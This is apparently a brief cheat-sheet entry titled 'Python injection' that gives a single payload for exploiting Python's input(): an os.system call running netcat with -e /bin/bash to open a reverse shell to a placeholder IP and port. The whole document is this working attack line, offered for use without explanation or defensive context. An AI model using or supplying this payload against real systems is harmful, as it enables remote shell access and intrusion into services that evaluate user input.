# Python injection

## Exploit input()
```python
__import__("os").system("nc -e /bin/bash [ip] [port]")'
```
